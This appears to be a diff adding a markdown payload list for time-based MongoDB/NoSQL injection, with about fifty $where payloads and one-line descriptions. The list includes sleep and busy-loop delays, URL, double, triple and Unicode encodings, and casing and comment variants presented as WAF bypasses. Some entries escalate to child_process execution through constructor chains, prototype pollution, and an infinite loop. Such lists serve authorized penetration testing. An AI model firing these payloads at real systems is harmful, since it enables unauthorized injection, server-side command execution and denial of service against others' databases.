@@ -1,0 +1,105 @@
+# MongoDB
+
+These payloads cause time delays to prove interaction via injection. Variations include case changes, comments, encodings (URL, double URL, Unicode), inline spaces/comments, and WAF bypass tricks like nested functions or heavy computations.
+
+- **{"$where": "sleep(5000)"}**  
+  Standard JS sleep 5 seconds.
+- **;sleep(5000);**  
+  Semicolon JS sleep.
+- **{"$where": "function(){sleep(5000); return true;}"}**  
+  Function-wrapped sleep.
+- **{"$where": "this.username && sleep(5000)"}**  
+  Conditional field sleep.
+- **%7B%22%24where%22%3A%20%22sleep%285000%29%22%7D**  
+  URL-encoded sleep.
+- **\u007B"$where": "sleep(5000)"\u007D**  
+  Unicode JSON sleep.
+- **{"$where": "SlEeP(5000)"}**  
+  Case variation sleep.
+- **{"$where": /*comment*/"sleep(5000)"/*comment*/}**  
+  JS inline comments.
+- **{"$where": "sleep (5000)"}**  
+  Spaced sleep.
+- **{"$where": "sleep/**/(5000)"}**  
+  Comment in function.
+- **{"username": {"$ne": null}, "$where": "sleep(5000)"}**  
+  Operator + sleep.
+- **%257B%2522%2524where%2522%3A%20%2522sleep%285000%29%2522%257D**  
+  Double URL sleep.
+- **{"$where": "if(1==1){sleep(5000)}"}**  
+  IF conditional sleep.
+- **{"$or": [{"a": {"$ne": 1}}, {"$where": "sleep(5000)"}]}**  
+  OR operator sleep.
+- **';sleep(5000);'**  
+  Trailing semicolon sleep.
+- **{"$where": "this.constructor.constructor('return process')().mainModule.require('child_process').exec('sleep 5')"}**  
+  Child process exec sleep.
+- **{"$where": "function() { var x = 0; while (true) { x++; } }"}**  
+  Infinite loop delay.
+- **{"$where": "new Date().getTime() + 5000"}**  
+  Time check loop.
+- **{"$where": "sleep(5000) || 1"}**  
+  OR logical sleep.
+- **{"$where": "sleep(5000) && 1"}**  
+  AND logical sleep.
+- **%7B%22%24where%22%3A%22SlEeP%285000%29%22%7D**  
+  Case + URL sleep.
+- **{"$where": "sleep/* */(5000)"}**  
+  Comment param sleep.
+- **{"$where": "s l e e p (5000)"}**  
+  Fully spaced sleep.
+- **{"$where": "sleep(5000)#"}**  
+  Hash comment sleep.
+- **{"$where": "sleep(5000)--"}**  
+  Dash comment sleep.
+- **{"$where": "function(){var d=new Date();var c=d.getTime()+5000;while(d.getTime()<c){d=new Date();}return true;}"}**  
+  While loop time delay.
+- **{"a": {"$in": [/.*/]}, "$where": "sleep(5000)"}**  
+  Regex IN + sleep.
+- **\u007B\u0022\u0024where\u0022\u003A \u0022sleep\u00285000\u0029\u0022\u007D**  
+  Full Unicode sleep.
+- **{"$where": "sleep(10000)"}**  
+  Longer 10-second sleep.
+- **{"$where": "this.password.match(/.*/)&&sleep(5000)"}**  
+  Regex match + sleep.
+- **;return sleep(5000);**  
+  Return sleep.
+- **{"$where": "1 == 1 && sleep(5000)"}**  
+  Condition && sleep.
+- **%7B%22%24where%22%3A%221%20%3D%3D%201%20%26%26%20sleep%285000%29%22%7D**  
+  URL condition sleep.
+- **{"$where": "sleep(5000) or 1==1"}**  
+  OR condition sleep.
+- **{"$where": "sleep(5000) and 1==1"}**  
+  AND condition sleep.
+- **{"$where": "sleep(5000);true;"}**  
+  Chained statement sleep.
+- **{"$where": "true; sleep(5000);"}**  
+  Preceded sleep.
+- **{"$where": "sleep(5000)/*comment*/"}**  
+  JS comment sleep.
+- **{"$where": "sleep(5000)//"}**  
+  Line comment sleep.
+- **%25257B%252522%252524where%252522%25253A%252520%252522sleep%2525285000%252529%252522%25257D**  
+  Triple URL sleep.
+- **{"$where": "function(){for(var i=0;i<10000000;i++){} return true;}"}**  
+  For loop heavy computation.
+- **{"$where": "var x=0;while(x<10000000){x++;} return true;"}**  
+  While loop computation.
+- **{"username":{"$regex":".*"}, "$where":"sleep(5000)"}**  
+  Regex + sleep.
+- **{"$or":[{"_id":{"$exists":true}},{"$where":"sleep(5000)"}]}**  
+  Exists OR sleep.
+- **';var date = new Date(); var curDate = null; do{curDate = new Date();}while(curDate-date < 5000);'**  
+  Do-while time loop.
+- **{"$where": "this.constructor.prototype.polluted = true; sleep(5000)" }**  
+  Prototype pollution + sleep.
+- **{"$where": "sleep(5000).toString()"}**  
+  Method chain sleep.
+- **{"$where": "[].find.constructor('return process')().mainModule.require('child_process').exec('sleep 5')"}**  
+  Constructor exec sleep.
+- **{"$where": "sleep(5000) == null ? false : true"}**  
+  Ternary sleep.
+- **{"$where": "if(true){sleep(5000)}else{false}"}**  
+  If-else sleep.
+
